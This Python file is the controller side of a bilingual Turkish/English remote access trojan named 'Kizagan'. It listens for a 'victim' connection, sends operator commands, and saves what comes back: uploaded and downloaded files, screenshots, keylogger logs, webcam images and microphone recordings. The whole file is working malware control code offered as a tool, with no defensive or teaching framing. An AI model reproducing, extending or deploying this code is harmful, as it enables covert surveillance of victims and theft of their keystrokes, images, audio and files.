import socket
import colorama
from colorama import Fore,Back
import os
import simplejson
import base64
import datetime
import random
import time
import argparse
from util import version_control


colorama.init(autoreset=True)


class TR_Dinleyici():
    def __init__(self,ip,port):
        self.Banner_goster()
        dinleyici = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        dinleyici.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        try:
            dinleyici.bind((ip,port))
            dinleyici.listen(0)
        except OSError:
            print(Fore.MAGENTA+"IP ve port numarası yanlış tekrar kontrol edin.")
            exit()
        try:
            print(Back.BLACK + Fore.RED+"[+]Gelecek baglantilar dinlenilmeye baslandi.\n\n")
            (self.baglanti,adres) = dinleyici.accept()
        except KeyboardInterrupt:
            print(Fore.RED+"[-]CTRL+C algılandı.Çıkılıyor...")
            exit()
        print(Fore.GREEN+"[!]Kurban baglantisi geldi :" + str(adres)+"\n\n")
        time.sleep(2)
        self.Banner_goster()
        print(Fore.RED+"Komutlar için 'yardim' yaziniz.")

    def renk_ve_yazi_sec(self):
        yazi1 = """

                ██╗░░██╗██╗███████╗░█████╗░░██████╗░░█████╗░███╗░░██╗
                ██║░██╔╝██║╚════██║██╔══██╗██╔════╝░██╔══██╗████╗░██║
                █████═╝░██║░░███╔═╝███████║██║░░██╗░███████║██╔██╗██║
                ██╔═██╗░██║██╔══╝░░██╔══██║██║░░╚██╗██╔══██║██║╚████║
                ██║░╚██╗██║███████╗██║░░██║╚██████╔╝██║░░██║██║░╚███║
                ╚═╝░░╚═╝╚═╝╚══════╝╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝"""
        yazi2 = """
                __  __     __     ______     ______     ______     ______     __   __    
                /\ \/ /    /\ \   /\___  \   /\  __ \   /\  ___\   /\  __ \   /\ "-.\ \   
                \ \  _"-.  \ \ \  \/_/  /__  \ \  __ \  \ \ \__ \  \ \  __ \  \ \ \-.  \  
                 \ \_\ \_\  \ \_\   /\_____\  \ \_\ \_\  \ \_____\  \ \_\ \_\  \ \_\\"\_\ 
                  \/_/\/_/   \/_/   \/_____/   \/_/\/_/   \/_____/   \/_/\/_/   \/_/ \/_/ 

                        """
        yazi3 = """
                888    d8P  8888888 8888888888P        d8888  .d8888b.         d8888 888b    888 
                888   d8P     888         d88P        d88888 d88P  Y88b       d88888 8888b   888 
                888  d8P      888        d88P        d88P888 888    888      d88P888 88888b  888 
                888d88K       888       d88P        d88P 888 888            d88P 888 888Y88b 888 
                8888888b      888      d88P        d88P  888 888  88888    d88P  888 888 Y88b888 
                888  Y88b     888     d88P        d88P   888 888    888   d88P   888 888  Y88888 
                888   Y88b    888    d88P        d8888888888 Y88b  d88P  d8888888888 888   Y8888 
                888    Y88b 8888888 d8888888888 d88P     888  "Y8888P88 d88P     888 888    Y888 """
        yazi4 = """
                  _  _______ ______         _____          _   _ 
                 | |/ /_   _|___  /   /\   / ____|   /\   | \ | |
                 | ' /  | |    / /   /  \ | |  __   /  \  |  \| |
                 |  <   | |   / /   / /\ \| | |_ | / /\ \ | . ` |
                 | . \ _| |_ / /__ / ____ \ |__| |/ ____ \| |\  |
                 |_|\_\_____/_____/_/    \_\_____/_/    \_\_| \_|                                 
                        """
        yazi5 = """
                $$\   $$\ $$$$$$\ $$$$$$$$\  $$$$$$\   $$$$$$\   $$$$$$\  $$\   $$\ 
                $$ | $$  |\_$$  _|\____$$  |$$  __$$\ $$  __$$\ $$  __$$\ $$$\  $$ |
                $$ |$$  /   $$ |      $$  / $$ /  $$ |$$ /  \__|$$ /  $$ |$$$$\ $$ |
                $$$$$  /    $$ |     $$  /  $$$$$$$$ |$$ |$$$$\ $$$$$$$$ |$$ $$\$$ |
                $$  $$<     $$ |    $$  /   $$  __$$ |$$ |\_$$ |$$  __$$ |$$ \$$$$ |
                $$ |\$$\    $$ |   $$  /    $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |\$$$ |
                $$ | \$$\ $$$$$$\ $$$$$$$$\ $$ |  $$ |\$$$$$$  |$$ |  $$ |$$ | \$$ |
                \__|  \__|\______|\________|\__|  \__| \______/ \__|  \__|\__|  \__|


                                                                                 """
        kirmizi = Fore.RED
        yesil = Fore.GREEN
        mavi = Fore.BLUE
        sari = Fore.YELLOW
        acik_mavi = Fore.CYAN
        mor = Fore.MAGENTA
        yazilar = [yazi1, yazi2, yazi3, yazi4, yazi5]
        renkler = [kirmizi, yesil, mavi, sari, acik_mavi, mor]
        yazi_secimi = random.choice(yazilar)
        renk_secimi = random.choice(renkler)
        return yazi_secimi,renk_secimi

    def Banner_goster(self):
        os.system("clear")
        yazi,renk = self.renk_ve_yazi_sec()
        print(renk+yazi)
        time.sleep(1)
        yazi,renk = self.renk_ve_yazi_sec()
        print(Fore.YELLOW + "\nAvrupa Hunlarının Savaş Tanrısı.\n")
        print(renk+"\t\t\t\t\t\tYazarı : Yiğit Aydemir\n\n\n\n")
        time.sleep(0.5)



    def Json_Gonder(self,bilgi):
        json_bilgisi = simplejson.dumps(bilgi)
        self.baglanti.send(json_bilgisi.encode("utf-8"))
    def Json_Al(self):
        json_bilgisi = ""
        while True:
            try:
                json_bilgisi = json_bilgisi + self.baglanti.recv(100000).decode()
                return simplejson.loads(json_bilgisi)
            except ValueError:
                continue
    def Komut_Calistir(self,komut):
        self.Json_Gonder(komut)
        if komut[0] == "cikis":
            self.baglanti.close()
            exit()
        return self.Json_Al()


    def Dosya_Kaydet(self,yol,icerik):
        with open(yol,"wb") as dosya:
            dosya.write(base64.b64decode(icerik))
            if komut_girisi[0] == "ekran_goruntusu":
                return Fore.MAGENTA+"[+]Ekran goruntusu şuan durduğunuz dizine kaydedildi."
            elif komut_girisi[0] == "kg_kaydet":
                return Fore.MAGENTA+"[+]Keylogger dosyasi şuan durduğunuz dizine kaydedildi."
            elif komut_girisi[0] == "kamera_goruntusu_al":
                return Fore.MAGENTA+"[+]Kurbanin kamera goruntusu şuan durduğunuz dizine kaydedildi."
            elif komut_girisi[0] == "ses_kayit_indir":
                return Fore.MAGENTA+"[+]Kurbanın ses kaydı şuan durduğunuz dizine kaydedildi."
            else:
                return Fore.MAGENTA+"[+]Dosya şuan durduğunuz dizine indirildi."
    def Dosya_Icerigi_Al(self,yol):
        with open(yol,"rb") as dosya:
            return base64.b64encode(dosya.read())
    def Temizle(self):
        return os.system("clear")
    def Dosya_Tarih_Al(self):
        tarih = datetime.datetime.now()
        tarihli_dosya = str(tarih.hour) + ":" + str(tarih.minute) + ":" + str(tarih.second) + " "
        return tarihli_dosya
    def Yardim(self):
        with open("menus/menuTR.txt","r",encoding="utf-8") as menu:
            return Fore.GREEN+menu.read()
    def Dinleyici_Basla(self):
        while True:
            global komut_girisi
            print(Fore.RED+"<<<<<Konsol@kurban>>>>>")
            komut_girisi = input(Fore.BLUE + "        ╰──------>Komut:")
            komut_girisi = komut_girisi.split(" ")

            try:
                if komut_girisi[0] == "yukle":
                    dosya_icerigi = self.Dosya_Icerigi_Al(komut_girisi[1])
                    komut_girisi.append(dosya_icerigi)
                komut_cikisi = self.Komut_Calistir(komut_girisi)

                if komut_girisi[0] == "indir" and "Komut uygulanamadi.Kurban makinenin baglantisi kesilmis olabilir." not in komut_girisi:
                    komut_cikisi = self.Dosya_Kaydet(komut_girisi[1], komut_cikisi)
                elif komut_girisi[0] == "temizle":
                    komut_cikisi = self.Temizle()
                elif komut_girisi[0] == "yardim":
                    komut_cikisi = self.Yardim()
                elif komut_girisi[0] == "ekran_goruntusu":
                    komut_cikisi = self.Dosya_Kaydet(self.Dosya_Tarih_Al()+"kurban_ekran_goruntusu.png",komut_cikisi)
                elif komut_girisi[0] == "kg_kaydet":
                    komut_cikisi = self.Dosya_Kaydet(self.Dosya_Tarih_Al()+"kurbanin_keylogu.txt",komut_cikisi)
                elif komut_girisi[0] == "kamera_goruntusu_al":
                    komut_cikisi = self.Dosya_Kaydet(self.Dosya_Tarih_Al()+"kurban_kamera_goruntusu.png",komut_cikisi)
                elif komut_girisi[0] == "ses_kayit_indir":
                    komut_cikisi = self.Dosya_Kaydet(self.Dosya_Tarih_Al()+"kurban_mikrofon_kaydi.wav",komut_cikisi)
            except Exception:
                print(Back.BLACK+Fore.YELLOW+"Komut uygulanamadi.Kurban makinenin baglantisi kesilmis olabilir.")
            print(komut_cikisi)




class EN_Listener():
    def __init__(self, ip, port):
        self.Show_Banner()
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            listener.bind((ip, port))
            listener.listen(0)
        except OSError:
            print(Fore.MAGENTA + "Wrong IP or port number please try again.")
            exit()
        try:
            print(Back.BLACK + Fore.RED + "[+]Listening incoming connections.\n\n")
            (self.connection, self.address) = listener.accept()
        except KeyboardInterrupt:
            print(Fore.RED+"[-]CTRL+C detected.Exiting...")
            exit()
        print(Fore.GREEN + "[!]A victim connection came :" + str(self.address) + "\n\n")
        time.sleep(2)
        self.Show_Banner()
        print(Fore.RED + "For commands,use 'help' command.")

    def choose_color_and_text(self):
        text1 = """

                ██╗░░██╗██╗███████╗░█████╗░░██████╗░░█████╗░███╗░░██╗
                ██║░██╔╝██║╚════██║██╔══██╗██╔════╝░██╔══██╗████╗░██║
                █████═╝░██║░░███╔═╝███████║██║░░██╗░███████║██╔██╗██║
                ██╔═██╗░██║██╔══╝░░██╔══██║██║░░╚██╗██╔══██║██║╚████║
                ██║░╚██╗██║███████╗██║░░██║╚██████╔╝██║░░██║██║░╚███║
                ╚═╝░░╚═╝╚═╝╚══════╝╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝"""
        text2 = """
                __  __     __     ______     ______     ______     ______     __   __    
                /\ \/ /    /\ \   /\___  \   /\  __ \   /\  ___\   /\  __ \   /\ "-.\ \   
                \ \  _"-.  \ \ \  \/_/  /__  \ \  __ \  \ \ \__ \  \ \  __ \  \ \ \-.  \  
                 \ \_\ \_\  \ \_\   /\_____\  \ \_\ \_\  \ \_____\  \ \_\ \_\  \ \_\\"\_\ 
                  \/_/\/_/   \/_/   \/_____/   \/_/\/_/   \/_____/   \/_/\/_/   \/_/ \/_/ 

                        """
        text3 = """
                888    d8P  8888888 8888888888P        d8888  .d8888b.         d8888 888b    888 
                888   d8P     888         d88P        d88888 d88P  Y88b       d88888 8888b   888 
                888  d8P      888        d88P        d88P888 888    888      d88P888 88888b  888 
                888d88K       888       d88P        d88P 888 888            d88P 888 888Y88b 888 
                8888888b      888      d88P        d88P  888 888  88888    d88P  888 888 Y88b888 
                888  Y88b     888     d88P        d88P   888 888    888   d88P   888 888  Y88888 
                888   Y88b    888    d88P        d8888888888 Y88b  d88P  d8888888888 888   Y8888 
                888    Y88b 8888888 d8888888888 d88P     888  "Y8888P88 d88P     888 888    Y888 """
        text4 = """
                  _  _______ ______         _____          _   _ 
                 | |/ /_   _|___  /   /\   / ____|   /\   | \ | |
                 | ' /  | |    / /   /  \ | |  __   /  \  |  \| |
                 |  <   | |   / /   / /\ \| | |_ | / /\ \ | . ` |
                 | . \ _| |_ / /__ / ____ \ |__| |/ ____ \| |\  |
                 |_|\_\_____/_____/_/    \_\_____/_/    \_\_| \_|                                 
                        """
        text5 = """
                $$\   $$\ $$$$$$\ $$$$$$$$\  $$$$$$\   $$$$$$\   $$$$$$\  $$\   $$\ 
                $$ | $$  |\_$$  _|\____$$  |$$  __$$\ $$  __$$\ $$  __$$\ $$$\  $$ |
                $$ |$$  /   $$ |      $$  / $$ /  $$ |$$ /  \__|$$ /  $$ |$$$$\ $$ |
                $$$$$  /    $$ |     $$  /  $$$$$$$$ |$$ |$$$$\ $$$$$$$$ |$$ $$\$$ |
                $$  $$<     $$ |    $$  /   $$  __$$ |$$ |\_$$ |$$  __$$ |$$ \$$$$ |
                $$ |\$$\    $$ |   $$  /    $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |\$$$ |
                $$ | \$$\ $$$$$$\ $$$$$$$$\ $$ |  $$ |\$$$$$$  |$$ |  $$ |$$ | \$$ |
                \__|  \__|\______|\________|\__|  \__| \______/ \__|  \__|\__|  \__|


                                                                                 """
        red = Fore.RED
        green = Fore.GREEN
        blue = Fore.BLUE
        yellow = Fore.YELLOW
        cyan = Fore.CYAN
        magenta = Fore.MAGENTA
        texts = [text1, text2, text3, text4, text5]
        colors = [red, green, blue, yellow, cyan, magenta]
        text_choose = random.choice(texts)
        color_choose = random.choice(colors)
        return text_choose, color_choose

    def Show_Banner(self):
        os.system("clear")
        text, color = self.choose_color_and_text()
        print(color + text)
        time.sleep(1)
        text, color = self.choose_color_and_text()
        print(Fore.YELLOW + "\nGod of War of European Huns.\n")
        print(color + "\t\t\t\t\t\tAuthor : Yiğit Aydemir\n\n\n\n")
        time.sleep(0.5)

    def Send_Json(self, data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode("utf-8"))

    def Get_Json(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(100000).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def Execute_Command(self, command):
        self.Send_Json(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.Get_Json()

    def Save_File(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            if komut_girisi[0] == "get_ss":
                return Fore.MAGENTA + "[+]Screenshot saved current directory."
            elif komut_girisi[0] == "save_kg":
                return Fore.MAGENTA + "[+]Keylogger file saved current directory."
            elif komut_girisi[0] == "get_camera_image":
                return Fore.MAGENTA + "[+]Victim's camera image saved current directory."
            elif komut_girisi[0] == "download_sound_recording":
                return Fore.MAGENTA + "[+]Victim's microphone recording saved current directory."
            else:
                return Fore.MAGENTA + "[+]The file saved current directory."

    def Get_File_Contents(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def Clear(self):
        return os.system("clear")

    def Get_File_Date(self):
        date = datetime.datetime.now()
        date_file = str(date.hour) + ":" + str(date.minute) + ":" + str(date.second) + " "
        return date_file
    def Help(self):
        with open("menus/menuEN.txt","r") as menu:
            return Fore.LIGHTGREEN_EX+menu.read()

    def Start_Listener(self):
        while True:
            global komut_girisi
            print(Fore.RED + "<<<<<Console@victim>>>>>")
            komut_girisi = input(Fore.BLUE + "╰──------>Command:")
            komut_girisi = komut_girisi.split(" ")

            try:
                if komut_girisi[0] == "upload":
                    file_content = self.Get_File_Contents(komut_girisi[1])
                    komut_girisi.append(file_content)
                command_output = self.Execute_Command(komut_girisi)

                if komut_girisi[0] == "download" and "The command could not be applied.The victim may disconnected." not in komut_girisi:
                    command_output = self.Save_File(komut_girisi[1], command_output)
                elif komut_girisi[0] == "clear":
                    command_output = self.Clear()
                elif komut_girisi[0] == "help":
                    command_output = self.Help()
                elif komut_girisi[0] == "get_ss":
                    command_output = self.Save_File(self.Get_File_Date() + "victim_ss.png", command_output)
                elif komut_girisi[0] == "save_kg":
                    command_output = self.Save_File(self.Get_File_Date() + "victims_keylog.txt", command_output)
                elif komut_girisi[0] == "get_camera_image":
                    command_output = self.Save_File(self.Get_File_Date() + "victims_camera_image.png",command_output)
                elif komut_girisi[0] == "download_sound_recording":
                    command_output = self.Save_File(self.Get_File_Date() + "victims_microphone_sound.wav", command_output)
            except Exception:
                print(Back.BLACK + Fore.YELLOW + "The command could not be applied.The victim may disconnected.")
            print(command_output)

ap = argparse.ArgumentParser()
ap.add_argument("-ip","--ip_address",required=True,help="Enter the IP address to listen/tr:Dinlemek istediğiniz IP adresini giriniz")
ap.add_argument("-p","--port",required=True,help="Enter port to listen/tr:Dinlemek istediğiniz portu giriniz")
args = vars(ap.parse_args())
def Language_Choice_And_Update():
    try:
        os.system("clear")
        print(Fore.RED + "Dil seciniz/Choose Language :\n\ntr:Türkçe\nen:English")
        choice = input(Fore.BLUE + "Choice/Seciminiz:")
        if choice == "tr":
            guncelleme_var_mi = version_control.Is_Update_Avaliable()
            if guncelleme_var_mi:
                dinleyici = TR_Dinleyici(args["ip_address"],int(args["port"]))
                dinleyici.Dinleyici_Basla()
            else:
                def Guncelleme():
                    print(Fore.RED+"[!]Güncelleme mevcut.İndirmek ve kurmak ister misiniz?(E/H)")
                    guncelleme_cevap = input(Fore.MAGENTA+"Guncelleme yapilsin? :")
                    if guncelleme_cevap == "E" or guncelleme_cevap == "e":
                        version_control.Update()
                        print(Fore.BLUE+"[+]Güncelleme yapıldı.Güncellenmiş dosyanız = updated_kizagan arik onu kullanabilirsiniz.")
                        exit()
                    elif guncelleme_cevap == "H" or guncelleme_cevap == "h":
                        print(Fore.YELLOW+"[+]Güncelleme yapılmayacaktır.")
                        time.sleep(1)
                        dinleyici = TR_Dinleyici(args["ip_address"], int(args["port"]))
                        dinleyici.Dinleyici_Basla()
                    else:
                        print(Fore.LIGHTRED_EX+"[-]Yanlış seçim lütfen tekrar seçiniz.")
                        Guncelleme()
                Guncelleme()

        elif choice == "en":
            is_update = version_control.Is_Update_Avaliable()
            if is_update:
                listener = EN_Listener(args["ip_address"], int(args["port"]))
                listener.Start_Listener()
            else:
                def Updating():
                    print(Fore.RED + "[!]Update avaliable.Do you want to download?(Y/N)")
                    updating_answer = input(Fore.MAGENTA + "Make an update? :")
                    if updating_answer == "Y" or updating_answer == "y":
                        version_control.Update()
                        print(Fore.BLUE + "[+]Update was successfully.You can use updated_kizagan file.")
                        exit()
                    elif updating_answer == "N" or updating_answer == "n":
                        print(Fore.YELLOW + "[+]There will be no update.")
                        time.sleep(1)
                        listener = EN_Listener(args["ip_address"], int(args["port"]))
                        listener.Start_Listener()
                    else:
                        print(Fore.LIGHTRED_EX + "[-]Wrong choice.Choose it again.")
                        Updating()

                Updating()
        else:
            print("Wrong choice. Use 'tr' or 'en'./Yanlış seçim. 'tr' veya 'en' kullanin.")
            time.sleep(2)
            Language_Choice_And_Update()
    except KeyboardInterrupt:
        if choice == "tr":
            print(Fore.RED+"[-]CTRL+C algılandı.Çıkılıyor...")
            dinleyici.baglanti.close()
            exit()
        elif choice == "en":
            print(Fore.BLUE+"[-]CTRL+C detected.Exiting...")
            listener.connection.close()
            exit()
Language_Choice_And_Update()
